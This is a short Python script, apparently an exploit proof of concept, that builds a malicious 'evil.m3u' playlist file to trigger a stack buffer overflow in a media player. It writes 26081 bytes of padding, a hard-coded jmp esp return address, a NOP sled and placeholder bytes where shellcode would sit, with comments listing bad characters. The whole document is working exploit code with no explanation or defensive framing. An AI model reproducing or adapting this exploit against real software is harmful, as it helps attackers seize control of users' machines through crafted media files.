#!/usr/bin/python
# bad characters: \x09 \x0a
# jmp esp address: 1001b058
filename="evil.m3u"
nop = "\x90" * 32
jump = "\x58\xb0\x01\x10"
buffer ="\x41"* 26081 + jump + nop + "\x43" * (1000-4-len(nop))
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()